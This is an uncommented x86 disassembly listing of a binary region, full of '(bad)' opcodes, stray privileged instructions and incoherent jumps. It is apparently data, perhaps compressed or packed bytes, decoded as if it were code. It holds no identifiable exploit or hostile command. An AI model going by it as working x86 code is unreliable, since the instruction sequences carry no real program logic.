  427d1c:	xor    ch,BYTE PTR ds:0xda12737d
  427d22:	fldcw  WORD PTR ds:0x8196dad8
  427d29:	fist   WORD PTR [ecx+0x651dd5b3]
  427d2f:	inc    esi
  427d30:	add    BYTE PTR [edx+0x4ee97361],bl
  427d36:	or     ecx,ebx
  427d38:	test   BYTE PTR gs:[ecx+ebx*1+0x4e],bh
  427d3d:	mov    cl,0x7d
  427d3f:	xchg   DWORD PTR [edx+0x45],ecx
  427d42:	cmp    al,0xc0
  427d44:	or     dh,bh
  427d46:	adc    DWORD PTR [ebp-0x20],edx
  427d49:	or     eax,0x718181a1
  427d4e:	or     ebp,DWORD PTR [ecx-0x3121a19a]
  427d54:	add    BYTE PTR [ecx+0x5d],al
  427d57:	mov    edi,0xc267451d
  427d5c:	stc    
  427d5d:	lods   eax,DWORD PTR ds:[esi]
  427d5e:	ret    0x99ad
  427d61:	add    esi,DWORD PTR ds:0x499d407e
  427d67:	daa    
  427d68:	push   ecx
  427d69:	cs std 
  427d6b:	into   
  427d6c:	add    eax,DWORD PTR [eax-0x5e]
  427d6f:	mov    al,0x63
  427d71:	mov    eax,0x7fe9cb5b
  427d76:	dec    ebx
  427d77:	mov    BYTE PTR [edx-0x397768f6],dl
  427d7d:	icebp  
  427d7e:	test   BYTE PTR [ebx-0x6f],al
  427d81:	scas   al,BYTE PTR es:[edi]
  427d82:	mov    edi,0xcbc6850a
  427d87:	push   esp
  427d88:	lods   eax,DWORD PTR ds:[esi]
  427d89:	test   BYTE PTR [eax],0xe
  427d8c:	or     ecx,DWORD PTR [ebx+0x760db5cf]
  427d92:	cmp    DWORD PTR [eax+0x13],edi
  427d95:	xchg   DWORD PTR [edi+0x53],ebx
  427d98:	data16 or al,0x74
  427d9b:	sub    eax,0xe3fd8bcd
  427da0:	add    ebp,edi
  427da2:	push   ecx
  427da3:	outs   dx,BYTE PTR ds:[esi]
  427da4:	ja     0x427d2c
  427da6:	mov    ecx,0xa4ab20d2
  427dab:	pop    es
  427dac:	enter  0xabeb,0xe9
  427db0:	pop    edx
  427db1:	pop    edx
  427db2:	arpl   WORD PTR [esp+ebx*2],bp
	...
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [eax+eax*4-0x1c],dh
  427e25:	xor    al,al
  427e27:	test   eax,0x1070001
  427e2c:	add    BYTE PTR [eax],al
  427e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e2f:	ret    
  427e30:	lds    ecx,FWORD PTR [edi]
  427e32:	mov    ebx,0x1ca82d45
  427e37:	and    edx,0xffffffab
  427e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e3b:	xor    BYTE PTR [ecx-0x5c137a2],0xb6
  427e42:	ins    BYTE PTR es:[edi],dx
  427e43:	jl     0x427e38
  427e45:	pop    DWORD PTR [edx]
  427e47:	inc    ecx
  427e48:	(bad)  
  427e49:	iret   
  427e4a:	inc    eax
  427e4b:	xor    bh,BYTE PTR [edi]
  427e4d:	sub    BYTE PTR [esi],dh
  427e4f:	dec    ebx
  427e50:	stc    
  427e51:	cwde   
  427e52:	mov    ah,BYTE PTR [eax-0x36bf0176]
  427e58:	xor    ebx,0xfe4fc4c8
  427e5e:	fnstsw WORD PTR [ebx-0x79a56bb]
  427e64:	rcr    DWORD PTR [esp+ecx*2],cl
  427e67:	jns    0x427e59
  427e69:	jb     0x427e0e
  427e6b:	cli    
  427e6c:	dec    ebp
  427e6d:	das    
  427e6e:	gs pop ss
  427e70:	xor    al,0xaf
  427e72:	jae    0x427e74
  427e74:	aas    
  427e75:	sub    ah,BYTE PTR [ebx+0x16]
  427e78:	mov    bh,0x40
  427e7a:	xor    al,0x64
  427e7c:	and    al,BYTE PTR [ecx]
  427e7e:	add    esi,ebx
  427e80:	fistp  DWORD PTR [edi]
  427e82:	pop    esi
  427e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e84:	jbe    0x427e33
  427e86:	in     eax,dx
  427e87:	dec    edx
  427e88:	int3   
  427e89:	pop    edx
  427e8a:	test   BYTE PTR [ecx-0x61],ch
  427e8d:	rcl    BYTE PTR [ebx-0xe76afe7],cl
  427e93:	and    BYTE PTR [edi],dl
  427e95:	fbstp  TBYTE PTR [edx+0x1b3a6b0f]
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	retf   0xc7d6
  427e9f:	ret    
  427ea0:	rcl    DWORD PTR [edx],1
  427ea2:	mov    ds:0x96926f69,eax
  427ea7:	inc    di
  427ea9:	rcl    BYTE PTR [ebx-0x64],1
  427eac:	fwait
  427ead:	aad    0xb4
  427eaf:	loopne 0x427edc
  427eb1:	das    
  427eb2:	sbb    DWORD PTR [esi+0x17],esi
  427eb5:	sbb    BYTE PTR [eax-0x3c23810e],ch
  427ebb:	push   esp
  427ebc:	loope  0x427f2f
  427ebe:	push   es
  427ebf:	ret    
  427ec0:	mov    ecx,0xc0d27e9b
  427ec5:	out    0xef,eax
  427ec7:	stos   DWORD PTR es:[edi],eax
  427ec8:	sbb    eax,0xfb644985
  427ecd:	inc    ebp
  427ece:	aaa    
  427ecf:	addr16 (bad) 
  427ed1:	cli    
  427ed2:	inc    ebx
  427ed3:	ja     0x427e64
  427ed5:	jge    0x427ea0
  427ed7:	jmp    0xdd00:0xc5ac352c
  427ede:	rcr    BYTE PTR [esi+ebp*1+0x5c],0xf3
  427ee3:	sar    ah,0xda
  427ee6:	mov    ecx,0x950415a7
  427eeb:	sbb    BYTE PTR [eax],bl
  427eed:	or     eax,0x1c4cd877
  427ef2:	pushf  
  427ef3:	xchg   ebp,eax
  427ef4:	sar    DWORD PTR [esi],cl
  427ef6:	ss fcmovnbe st,st(5)
  427ef9:	pusha  
  427efa:	cmp    edx,DWORD PTR [ecx]
  427efc:	jecxz  0x427e89
  427efe:	fs cwde 
  427f00:	add    eax,0xf94db685
  427f05:	imul   edi,DWORD PTR [ebp-0x75],0x5be70f2a
  427f0c:	hlt    
  427f0d:	sub    ah,BYTE PTR [edi+0x6034c3ba]
  427f13:	cwde   
  427f14:	(bad)
  427f18:	repnz xchg esp,eax
  427f1a:	scas   eax,DWORD PTR es:[edi]
  427f1b:	dec    edx
  427f1c:	jae    0x427f74
  427f1e:	(bad)  
  427f1f:	(bad)  
  427f20:	enter  0x5a99,0xf5
  427f24:	xchg   ebp,eax
  427f25:	and    DWORD PTR [ecx-0x39],ebp
  427f28:	sub    bh,BYTE PTR [ebp+0x75eb79c5]
  427f2e:	lahf   
  427f2f:	stos   BYTE PTR es:[edi],al
  427f30:	(bad)  
  427f31:	jmp    DWORD PTR ds:0xdccd
	...
  427f93:	add    BYTE PTR [eax],al
  427f95:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	mov    eax,0xc7bc099f
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR ds:0x8e6fc7f8,al
  427fb3:	xchg   esp,eax
  427fb4:	lods   eax,DWORD PTR ds:[esi]
  427fb5:	sbb    eax,0x265cd8fe
  427fba:	and    BYTE PTR [ebx-0x27],dh
  427fbd:	outs   dx,DWORD PTR ds:[esi]
  427fbe:	sti    
  427fbf:	and    DWORD PTR [ecx+esi*2-0x18],ebx
  427fc3:	lock mov esp,0x5c8d5e87
  427fc9:	cmp    esi,edi
  427fcb:	sbb    al,BYTE PTR [eax]
  427fcd:	or     al,0x6f
  427fcf:	mov    bh,BYTE PTR [ecx-0x4a]
  427fd2:	push   edx
  427fd3:	xchg   ebp,eax
  427fd4:	add    DWORD PTR [edi-0x32],esi
  427fd7:	sbb    BYTE PTR [edx-0x74],0xd4
  427fdb:	dec    edi
  427fdc:	pop    ds
  427fdd:	sub    BYTE PTR [eax+0x37],ah
  427fe0:	cmp    ecx,DWORD PTR [ebp-0x387e20fa]
  427fe6:	aam    0xf8
  427fe8:	mov    edi,0xeb6bc5c7
  427fed:	ds push ebx
  427fef:	mov    esp,0x3c44fb60
  427ff4:	mov    ebx,0xfef0ad0
  427ff9:	xlat   BYTE PTR ds:[ebx]
  427ffa:	fdivr  QWORD PTR [esi+ecx*1-0x6b9a8dba]
  428001:	pop    ds
  428002:	adc    ebx,DWORD PTR [edx+0xa60d10a]
  428008:	jb     0x427fac
  42800a:	sub    ebx,DWORD PTR ds:0x12ce9e7f
  428010:	mov    ecx,edi
  428012:	add    BYTE PTR [edx+0x6],0x82
  428016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428017:	leave  
  428018:	ficomp WORD PTR [ebp+edx*4+0x17]
  42801c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42801d:	into   
  42801e:	mov    BYTE PTR [ebx+ecx*8],cl
  428021:	xchg   ebp,eax
  428022:	in     eax,dx
  428023:	fadd   DWORD PTR [ecx+0x69]
  428026:	jmp    0x427ff7
  428028:	in     eax,0x70
  42802a:	dec    edi
  42802b:	cs jle 0x4280a1
  42802e:	or     DWORD PTR [edx+0x12],ebp
  428031:	and    BYTE PTR [eax],0x1f
  428034:	pop    edi
  428035:	lock mov ch,0x9e
  428038:	mov    al,0x4c
  42803a:	inc    ebp
  42803b:	inc    edi
  42803c:	in     eax,dx
  42803d:	or     ecx,edi
  42803f:	repnz (bad) 
  428042:	xor    DWORD PTR [eax-0x4a],ecx
  428045:	xchg   ebx,eax
  428046:	mov    edi,0xec929bbb
  42804b:	inc    ecx
  42804c:	sub    eax,0x669d21dd
  428051:	mov    cl,0x6f
  428053:	rcl    cl,0xf4
  428056:	ja     0x4280a6
  428058:	add    BYTE PTR [eax+0x579ff02c],bl
  42805e:	in     al,dx
  42805f:	lods   al,BYTE PTR ds:[esi]
  428060:	cmp    DWORD PTR [ebp-0x74],eax
  428063:	pop    ss
  428064:	jmp    0x428066
  428066:	loope  0x428069
  428068:	fbstp  TBYTE PTR [ebp-0x50]
  42806b:	jl     0x428042
  42806d:	mov    ch,0xf2
  42806f:	mov    eax,ds:0x63d6ad9e
  428074:	pop    ds
  428075:	adc    al,0x8b
  428077:	mov    ebx,0xf2d086ac
  42807c:	sub    eax,0x7e02f690
  428081:	add    eax,0x82a5f91f
  428086:	div    DWORD PTR [esp+ebx*1]
  428089:	lods   al,BYTE PTR ds:[esi]
  42808a:	add    BYTE PTR [edx-0x4c859898],ch
  428090:	xor    BYTE PTR [edi-0x6db3fe51],dh
  428096:	add    al,0x46
  428098:	dec    edx
  428099:	adc    BYTE PTR [edi+0x27455cd6],0xec
  4280a0:	lods   al,BYTE PTR ds:[esi]
  4280a1:	mul    BYTE PTR [eax]
  4280a3:	mov    bh,0x58
  4280a5:	dec    ebp
  4280a6:	xchg   edx,eax
  4280a7:	mov    ebx,0xc2b7d6c3
  4280ac:	inc    edx
  4280ad:	mov    bl,0x21
  4280af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b0:	and    DWORD PTR [edx+0x12],edx
  4280b3:	xor    BYTE PTR [ecx+0x0],0x0
	...
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	(bad)  
  428123:	xor    al,0xa2
  428125:	outs   dx,DWORD PTR ds:[esi]
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    cl,al
  42812f:	mov    edx,0xd2e266d3
  428134:	ins    DWORD PTR es:[edi],dx
  428135:	mov    WORD PTR [eax+0xd105987],ss
  42813b:	retf   0x45fb
  42813e:	inc    ebp
  42813f:	mov    esi,0x8063729a
  428144:	arpl   WORD PTR [edx+0x4db712a4],si
  42814a:	mov    ecx,DWORD PTR [esi+0x2a49c05d]
  428150:	loop   0x42813d
  428152:	sub    al,BYTE PTR [ebp-0x64125674]
  428158:	icebp  
  428159:	mov    esi,0xba814e97
  42815e:	sahf   
  42815f:	push   0xfffffff1
  428161:	ins    DWORD PTR es:[edi],dx
  428162:	and    BYTE PTR [eax+0x7d],al
  428165:	hlt    
  428166:	rcr    DWORD PTR [eax],cl
  428168:	jo     0x428130
  42816a:	or     al,0x8
  42816c:	outs   dx,DWORD PTR ds:[esi]
  42816d:	inc    ebx
  42816e:	pop    ecx
  42816f:	cmc    
  428170:	cdq    
  428171:	(bad)  
  428172:	pop    eax
  428173:	addr16 jbe 0x42815e
  428176:	xor    eax,0xec110660
  42817b:	(bad)  
  42817c:	adc    BYTE PTR [edx],ah
  42817e:	jo     0x428127
  428180:	dec    ecx
  428181:	hlt    
  428182:	xchg   DWORD PTR [edx-0x6b0552bf],esp
  428188:	sar    DWORD PTR cs:[edi-0x27119adb],cl
  42818f:	adc    bh,bh
  428191:	int    0x72
  428193:	sub    eax,0x6a78d815
  428198:	mov    dh,0xe5
  42819a:	(bad)  
  42819b:	sbb    al,0x90
  42819d:	popw   ds
  42819f:	stc    
  4281a0:	fwait
  4281a1:	cld    
  4281a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281a3:	imul   edx,DWORD PTR ds:0x3cc77079,0x34
  4281aa:	fist   WORD PTR [ebx+eiz*1+0x34]
  4281ae:	ret    0x1a4c
  4281b1:	test   al,0xa6
  4281b3:	aad    0x2f
  4281b5:	int3   
  4281b6:	pop    ecx
  4281b7:	pop    ebx
  4281b8:	mov    al,ds:0x4b4934a
  4281bd:	push   edi
  4281be:	in     al,0x35
  4281c0:	inc    edx
  4281c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281c2:	xor    eax,0xcb202243
  4281c7:	into   
  4281c8:	cmc    
  4281c9:	dec    esp
  4281ca:	fisttp DWORD PTR [ecx-0x68d33249]
  4281d0:	mov    al,ds:0x3203b8b3
  4281d5:	jb     0x4281cd
  4281d7:	add    al,0xf
  4281d9:	(bad)  
  4281da:	push   ecx
  4281db:	loope  0x42817f
  4281dd:	push   edx
  4281de:	or     eax,0x10453cc3
  4281e3:	xchg   esp,eax
  4281e4:	mov    bl,0xbc
  4281e6:	nop
  4281e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281e8:	mov    bh,0xf6
  4281ea:	add    al,0xf4
  4281ec:	push   es
  4281ed:	jo     0x42826d
  4281ef:	dec    edx
  4281f0:	cdq    
  4281f1:	pop    ds
  4281f2:	nop
  4281f3:	lods   al,BYTE PTR ds:[esi]
  4281f4:	(bad)  
  4281f6:	pop    ecx
  4281f7:	fidivr DWORD PTR [eax*2+0x59219114]
  4281fe:	jae    0x428209
  428200:	jae    0x4281a1
  428202:	adc    al,0x73
  428204:	mov    esp,0xe80bb0fa
  428209:	cmp    ah,BYTE PTR [ebx+esi*8-0x395ba474]
  428210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428211:	clc    
  428212:	adc    edx,DWORD PTR [edx]
  428214:	std    
  428215:	mov    ebx,0xc241c178
  42821a:	(bad)  
  42821c:	dec    ebp
  42821d:	mov    eax,ds:0x5e19c952
  428222:	and    bh,BYTE PTR [edi+0x1561a016]
  428228:	sbb    DWORD PTR [ebx-0x60],edi
  42822b:	sti    
  42822c:	dec    eax
  42822d:	addr16 sti 
  42822f:	sub    al,0x33
  428231:	jno    0x4281f0
  428233:	sbb    eax,0x6a
	...
  428294:	add    BYTE PTR [eax],al
  428296:	(bad)  
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	lahf   
  4282a3:	int    0xce
  4282a5:	sub    edx,ebp
  4282a7:	lods   al,BYTE PTR ds:[esi]
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    cl,al
  4282af:	daa    
  4282b0:	(bad)  
  4282b2:	inc    edx
  4282b3:	nop
  4282b4:	(bad)  
  4282b6:	std    
  4282b7:	ja     0x4282de
  4282b9:	fs retf 
  4282bb:	cld    
  4282bc:	pushf  
  4282bd:	push   ds
  4282be:	stos   BYTE PTR es:[edi],al
  4282bf:	stos   DWORD PTR es:[edi],eax
  4282c0:	jns    0x428286
  4282c2:	stos   BYTE PTR es:[edi],al
  4282c3:	std    
  4282c4:	mov    ch,0x5b
  4282c6:	adc    eax,0x8c76dfe7
  4282cb:	mov    ah,0xd0
  4282cd:	sub    eax,0xaa625e1c
  4282d2:	push   edx
  4282d3:	mov    ebx,0x43d9d66d
  4282d8:	adc    dl,dh
  4282da:	test   DWORD PTR ds:[eax+0x3b342ef1],ecx
  4282e1:	sbb    BYTE PTR [ebp+0x5e],dl
  4282e4:	inc    edx
  4282e5:	push   edx
  4282e6:	int3   
  4282e7:	mov    ah,0xca
  4282e9:	jl     0x42829f
  4282eb:	push   ds
  4282ec:	sub    esi,edi
  4282ee:	dec    esp
  4282ef:	test   al,0x5b
  4282f1:	stc    
  4282f2:	scas   eax,DWORD PTR es:[edi]
  4282f3:	test   BYTE PTR [esi],ah
  4282f5:	cdq    
  4282f6:	pop    edx
  4282f7:	inc    eax
  4282f8:	push   edx
  4282f9:	inc    ecx
  4282fa:	pop    ebx
  4282fb:	add    bh,BYTE PTR [edi+0x2e]
  4282fe:	mov    eax,ds:0x9d49a33f
  428303:	out    0x16,eax
  428305:	or     DWORD PTR [esi-0x2c],edx
  428308:	cmp    ah,BYTE PTR [ebx+0x18]
  42830b:	cmp    DWORD PTR [ebx],esp
  42830d:	push   ebx
  42830e:	std    
  42830f:	xlat   BYTE PTR ds:[ebx]
  428310:	mov    bh,0xc0
  428312:	lds    edi,FWORD PTR [ebx+0x4c]
  428315:	je     0x4282b6
  428317:	std    
  428318:	pop    esi
  428319:	mov    WORD PTR [eax+0x64],ss
  42831c:	imul   ecx,ecx,0x49a1269b
  428322:	popa   
  428323:	dec    edi
  428324:	pushf  
  428325:	dec    ebp
  428326:	pop    ebx
  428327:	mov    esp,0x15d10f1d
  42832c:	cdq    
  42832d:	das    
  42832e:	aad    0xf5
  428330:	das    
  428331:	test   al,0xfa
  428333:	gs dec edi
  428335:	push   ds
  428336:	and    al,BYTE PTR [esi+eiz*2+0x41cf9e23]
  42833d:	daa    
  42833e:	add    edi,eax
  428340:	add    dl,BYTE PTR [edi]
  428342:	inc    edi
  428343:	bnd jno 0x428325
  428346:	jmp    0x52ee:0x1a24ffae
  42834d:	outs   dx,BYTE PTR ds:[esi]
  42834e:	test   eax,0x8a7e5a32
  428353:	inc    eax
  428354:	ins    BYTE PTR es:[edi],dx
  428355:	iret   
  428356:	addr16 jg 0x428352
  428359:	fstp   DWORD PTR [ecx]
  42835b:	int    0xf2
  42835d:	sar    DWORD PTR [esp+edx*4],cl
  428360:	call   0xa4b7:0x80ae742
  428367:	leave  
  428368:	std    
  428369:	dec    eax
  42836a:	jno    0x4283c2
  42836c:	pop    ebp
  42836d:	and    dh,ah
  42836f:	adc    DWORD PTR [edi],0xffffffa9
  428372:	and    eax,ebx
  428374:	les    ebx,FWORD PTR [ebx]
  428376:	or     eax,0x3bc7ffd9
  42837b:	mov    edi,0xaec00e6b
  428380:	push   ebx
  428381:	push   ss
  428382:	pop    esi
  428383:	out    dx,eax
  428384:	xchg   edx,eax
  428385:	xchg   DWORD PTR [eax],eax
  428387:	ins    DWORD PTR es:[edi],dx
  428388:	out    0x5d,al
  42838a:	out    0xa2,eax
  42838c:	add    dl,dl
  42838e:	mov    ebx,0xf3045010
  428393:	leave  
  428394:	jne    0x428411
  428396:	out    0xad,al
  428398:	push   0xb
  42839a:	mov    dh,BYTE PTR [esi+0x2e8a8721]
  4283a0:	push   edx
  4283a1:	add    al,0xa9
  4283a3:	cmp    BYTE PTR [ebx],al
  4283a5:	inc    edi
  4283a6:	ds pop edx
  4283a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283a9:	pop    ecx
  4283aa:	iret   
  4283ab:	leave  
  4283ac:	mov    BYTE PTR [esp+edx*8-0x54],bl
  4283b0:	xchg   ebx,eax
  4283b1:	in     eax,0xa4
  4283b3:	popa   
  4283b4:	fld    DWORD PTR [eax]
	...
  428416:	push   cs
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	dec    BYTE PTR [eax-0x2355d56e]
  428427:	lods   eax,DWORD PTR ds:[esi]
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [ebx-0x2df7bee0],bh
  428433:	nop
  428434:	ror    DWORD PTR [ecx],cl
  428436:	and    DWORD PTR [ebp-0x42],edi
  428439:	fild   DWORD PTR [esi]
  42843b:	sti    
  42843c:	(bad)  
  42843d:	ja     0x4283f7
  42843f:	stos   DWORD PTR es:[edi],eax
  428440:	sub    ah,dl
  428442:	loopne 0x4284a0
  428444:	add    DWORD PTR [ebx],ecx
  428446:	dec    ebp
  428447:	cmp    al,0x42
  428449:	sbb    BYTE PTR [edx+0x2613001d],bh
  42844f:	cmp    al,0xec
  428451:	cmp    edx,edx
  428453:	push   ebp
  428454:	push   0x472fbb54
  428459:	nop
  42845a:	mov    edx,DWORD PTR [esp+edi*1]
  42845d:	sbb    eax,0x12460abd
  428462:	ja     0x4284cf
  428464:	pop    ecx
  428465:	lahf   
  428466:	repz mov ecx,0x32a3a877
  42846c:	xor    ecx,0xffffffee
  42846f:	ficom  WORD PTR [ebp+0x70]
  428472:	mov    al,0x14
  428474:	nop
  428475:	test   BYTE PTR [ebp-0x7d067900],dh
  42847b:	fbstp  TBYTE PTR [ebx-0x21]
  42847e:	icebp  
  42847f:	leave  
  428480:	test   eax,0x81fbc788
  428485:	push   eax
  428486:	add    al,BYTE PTR [ecx+0x70]
  428489:	aam    0x81
  42848b:	lahf   
  42848c:	test   al,0x1f
  42848e:	push   cs
  42848f:	test   BYTE PTR [edi+esi*4-0x19a64b91],al
  428496:	in     al,dx
  428497:	push   ebp
  428498:	imul   esp,DWORD PTR [ebp+ebx*4+0x16],0xffffffa4
  42849d:	out    0xbf,eax
  42849f:	inc    ebx
  4284a0:	iret   
  4284a1:	stos   BYTE PTR es:[edi],al
  4284a2:	(bad)  
  4284a4:	out    dx,eax
  4284a5:	sbb    DWORD PTR [esi-0x41856207],ebx
  4284ab:	push   ds
  4284ac:	rol    BYTE PTR [ebx-0x509d0983],1
  4284b2:	xchg   DWORD PTR [edx],esi
  4284b4:	sub    al,al
  4284b6:	retf   
  4284b7:	mov    WORD PTR [ecx-0x3a007628],ds
  4284bd:	ror    DWORD PTR [ebp+0x5],1
  4284c0:	mov    dh,0x64
  4284c2:	sbb    BYTE PTR [ebx-0x18],ah
  4284c5:	pop    edi
  4284c6:	dec    esp
  4284c7:	pop    edx
  4284c8:	cli    
  4284c9:	inc    ecx
  4284ca:	jg     0x4284f2
  4284cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284cd:	push   ecx
  4284ce:	outs   dx,DWORD PTR ds:[esi]
  4284cf:	push   ebp
  4284d0:	loopne 0x42851a
  4284d2:	lods   al,BYTE PTR ds:[esi]
  4284d3:	xchg   ebx,eax
  4284d4:	outs   dx,BYTE PTR ds:[esi]
  4284d5:	jle    0x428474
  4284d7:	dec    esi
  4284d8:	imul   ebp,ecx,0xffffff82
  4284db:	xchg   ah,dh
  4284dd:	stos   DWORD PTR es:[edi],eax
  4284de:	scas   al,BYTE PTR es:[edi]
  4284df:	mov    cl,0xe7
  4284e1:	inc    sp
  4284e3:	or     ebx,ecx
  4284e5:	out    dx,eax
  4284e6:	mov    dh,0x11
  4284e8:	add    edx,ebx
  4284ea:	add    DWORD PTR ds:0xf39730e7,esi
  4284f0:	adc    bl,BYTE PTR [ebx+0x56bc1c88]
  4284f6:	or     BYTE PTR [ebx-0x20],ah
  4284f9:	or     al,0xc8
  4284fb:	cli    
  4284fc:	pop    ebx
  4284fd:	ds aas 
  4284ff:	inc    esi
  428500:	bswap  ebx
  428502:	inc    ecx
  428503:	cmp    DWORD PTR [ebx],0xdfabbee2
  428509:	xor    eax,0x670beeda
  42850e:	fwait
  42850f:	mov    eax,ds:0xdc309c3e
  428514:	xchg   edx,eax
  428515:	and    BYTE PTR [edx-0x36],al
  428518:	fldcw  WORD PTR [edi-0x3f]
  42851b:	stos   BYTE PTR es:[edi],al
  42851c:	daa    
  42851d:	dec    ebx
  42851e:	jecxz  0x4284de
  428520:	stos   BYTE PTR es:[edi],al
  428521:	mov    al,ds:0x1fe8b946
  428526:	dec    ebp
  428527:	data16 (bad) 
  428529:	loope  0x4284ec
  42852b:	jle    0x4285a1
  42852d:	call   0x4ae:0x77ae78be
  428534:	push   esp
	...
  428595:	add    BYTE PTR [ecx-0xa],dl
  428598:	xor    eax,0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	inc    ebp
  4285a3:	fld    QWORD PTR [edi+0x1aee3d0]
  4285a9:	add    BYTE PTR [edi],al
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [edi+0x49],dh
  4285b0:	leave  
  4285b1:	cmp    eax,0x51762169
  4285b6:	sar    DWORD PTR [ebx+eiz*2],cl
  4285b9:	xchg   edx,eax
  4285ba:	sbb    edx,eax
  4285bc:	sbb    al,0x20
  4285be:	imul   ebp,DWORD PTR [edx],0xe348ef4c
  4285c4:	push   ss
  4285c5:	adc    DWORD PTR [ecx+0x3b],ecx
  4285c8:	jmp    0xa5c2b9e8
  4285cd:	mov    edx,0x94ba8a3
  4285d2:	inc    edi
  4285d3:	mov    DWORD PTR [esi+ecx*2],esi
  4285d6:	sbb    ecx,esp
  4285d8:	outs   dx,DWORD PTR ds:[esi]
  4285d9:	mov    eax,DWORD PTR [eax-0x13]
  4285dc:	push   0xddd3be17
  4285e1:	push   esp
  4285e2:	pusha  
  4285e3:	pushf  
  4285e4:	lahf   
  4285e5:	shl    BYTE PTR ds:0xf52410f9,1
  4285eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285ec:	dec    edi
  4285ed:	paddd  mm1,QWORD PTR [esi-0x11540c46]
  4285f4:	xchg   ecx,edi
  4285f6:	adc    BYTE PTR [edi+0x1842a12e],dl
  4285fc:	pop    edi
  4285fd:	and    ecx,DWORD PTR [ebx]
  4285ff:	(bad)  
  428600:	push   ds
  428601:	push   eax
  428602:	in     eax,dx
  428603:	cmp    al,0x48
  428605:	add    BYTE PTR [edx+0x54062a8d],al
  42860b:	cmp    cl,BYTE PTR [ebx]
  42860d:	sub    ebx,esp
  42860f:	sbb    ecx,edi
  428611:	jno    0x428594
  428613:	lahf   
  428614:	adc    ecx,DWORD PTR [ebp+0x65]
  428617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428619:	pop    esi
  42861a:	je     0x428660
  42861c:	fucom  st(0)
  42861e:	cmp    DWORD PTR [esi],ebp
  428620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428621:	sbb    eax,0x2c70b310
  428626:	nop
  428627:	push   ss
  428628:	cmp    ebx,DWORD PTR [ebp+edx*1+0x20]
  42862c:	std    
  42862d:	mov    al,0xec
  42862f:	and    al,0xf9
  428631:	and    eax,0xe90489ad
  428636:	(bad)  
  428638:	mov    edi,0xd6d7809a
  42863d:	sbb    BYTE PTR [edx-0x6082ba29],dl
  428643:	push   ebx
  428644:	scas   al,BYTE PTR es:[edi]
  428645:	jecxz  0x42861b
  428647:	mov    BYTE PTR [eax+0x587e074e],bl
  42864d:	cmp    eax,0x240fd6e9
  428652:	sub    cl,bh
  428654:	std    
  428655:	xchg   ebp,eax
  428656:	mov    al,ds:0xea8189eb
  42865b:	mov    dh,0xa8
  42865d:	mov    DWORD PTR [ebp-0x703d019f],ecx
  428663:	pop    es
  428664:	sbb    DWORD PTR [edx+eax*2+0x16],edx
  428668:	ja     0x428646
  42866a:	adc    eax,0x5a4c4e6d
  42866f:	(bad)  
  428670:	pop    esi
  428671:	ds ja  0x42864f
  428674:	mov    bh,0x3f
  428676:	xchg   ebx,eax
  428677:	sub    ch,BYTE PTR [ebp-0x4f]
  42867a:	fst    DWORD PTR [ebx-0x7f]
  42867d:	je     0x4286fb
  42867f:	cmp    ebp,ecx
  428681:	in     al,dx
  428682:	stos   BYTE PTR es:[edi],al
  428683:	addr16 mov eax,esp
  428686:	add    eax,0x2c2a679
  42868b:	mov    eax,0x37e27a76
  428690:	repnz add dh,ch
  428693:	sbb    ecx,DWORD PTR [ebx-0x5d6d83f9]
  428699:	(bad)  
  42869a:	xchg   ecx,eax
  42869b:	xor    dh,ch
  42869d:	sub    bh,BYTE PTR [ebx+0xd]
  4286a0:	stos   BYTE PTR es:[edi],al
  4286a1:	aad    0xa2
  4286a3:	inc    esi
  4286a4:	inc    edi
  4286a5:	push   ss
  4286a6:	cmp    eax,0xc4baf35
  4286ab:	std    
  4286ac:	(bad)  
  4286ad:	cli    
  4286ae:	adc    esp,DWORD PTR [ecx]
  4286b0:	mov    dh,0xde
  4286b2:	inc    ch
  4286b4:	push   esp
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x22f9772f]
